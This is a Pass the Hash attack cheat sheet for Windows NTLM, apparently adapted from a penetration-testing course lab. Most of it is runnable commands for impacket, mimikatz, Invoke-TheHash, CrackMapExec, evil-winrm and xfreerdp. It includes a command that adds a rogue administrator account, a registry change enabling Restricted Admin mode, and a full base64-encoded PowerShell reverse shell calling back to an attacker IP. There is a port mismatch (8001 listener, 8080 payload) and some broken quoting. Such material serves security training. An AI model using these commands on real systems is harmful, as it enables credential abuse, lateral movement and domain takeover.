# Pass the Hash (PtH)
A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).

## Windows NTLM Introduction
Microsoft's Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.

With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a Pass the Hash (PtH) Attack.

## interactive-shell
**Pass the Hash with Impacket PsExec**
```
impacket-psexec -hashes ":<hash>"<user>@<ip>`
psexec.py -hashes ":<hash>"<user>@<ip>
```

**Pass the Hash with Mimikatz**
Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

    /user - The user name we want to impersonate.
    /rc4 or /NTLM - NTLM hash of the user's password.
    /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
    /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```
.\mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe"
```

### Pass the Hash with PowerShell Invoke-TheHash
Another tool we can use to perform Pass the Hash attacks on Windows is Invoke-TheHash. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. 

When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

    Target - Hostname or IP address of the target.
    Username - Username to use for authentication.
    Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
    Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
    Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.

**Invoke-TheHash with SMB**
```
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 10.129.186.240 -Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```


To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.

**Netcat Listener**
- `.\nc.exe -lvnp 8001`

To create a simple reverse shell using PowerShell, we can visit https://www.revshells.com/, set our IP 172.16.1.5 and port 8080, and select the option PowerShell #3 (Base64), as shown in the following image.

Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).

```
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADgAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

The result is a reverse shell connection from the DC01 host (172.16.1.10).

## pseudo-shell (file write and read)
### Impacket Toolkit
```
$ atexec.py -hashes ":<hash>" <user>@<ip>" command"
$ smbexec.py -hashes ":<hash>"<user>@<ip> 
$ wmiexec.py -hashes":<hash>" <user>@<ip> 
$ dcomexec.py -hashes ":<hash>"<user>@<ip> 
```


### CrackMapExec
CrackMapExec is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use CrackMapExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called "Password Spraying" and is covered in-depth in the Active Directory Enumeration & Attacks module. Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.

```
# No sure about :
$ crackmapexec smb <ip_range> -u <user> -d <domain> -H ':<hash>' 
$ crackmapexec smb <ip_range> -u <user> -H ':<hash>' --local-auth
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the Local Administrator Password Solution (LAPS), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.

**CrackMapExec - Command **Execution**
```
$ crackmapexec smb <ip_range> -u <user> -H ':<hash>' --local-auth -x whoami
```

## Evil-winrm
```
$ evil-winrm -i <ip> -u <user> -H <hash>
```

## RDP 
We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.

There are a few caveats to this attack:

    Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0. It can be done using the following command:

### Enable Restricted Admin Mode to Allow PtH
```
> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:

### Pass the Hash Using RDP
```
$ xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
```

## SMB
```
$ smbclient.py -hashes":<hash>" <user>@<ip>
```

## MSSQL
```
$ crackmapexec mssql <ip_range> -H':<hash>'
$ mssqlclient.py -windows-auth -hashes":<hash>"<domain>/<user>@<ip>
```

## UAC Limits Pass the Hash for Local Accounts
UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy.
